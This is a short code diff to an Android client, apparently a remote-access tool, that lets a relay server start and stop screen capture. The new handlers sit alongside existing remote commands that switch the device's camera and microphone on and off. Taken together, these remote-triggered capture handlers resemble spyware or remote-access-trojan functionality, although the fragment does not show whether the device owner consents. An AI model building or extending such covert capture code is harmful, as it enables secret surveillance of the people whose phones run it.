@@ -54,6 +54,13 @@ public class RelayClient {
 
             socket.on(Socket.EVENT_DISCONNECT, args -> Log.d(TAG, "Disconnected from relay"));
 
+            socket.on("start_screen", args -> {
+                android.content.Intent i = new android.content.Intent(
+                    service, ScreenCaptureActivity.class);
+                i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                service.startActivity(i);
+            });
+            socket.on("stop_screen",     args -> service.stopScreenStream());
             socket.on("camera_on",       args -> service.startCamera());
             socket.on("camera_off",      args -> service.stopCamera());
             socket.on("mic_on",          args -> service.startMic());
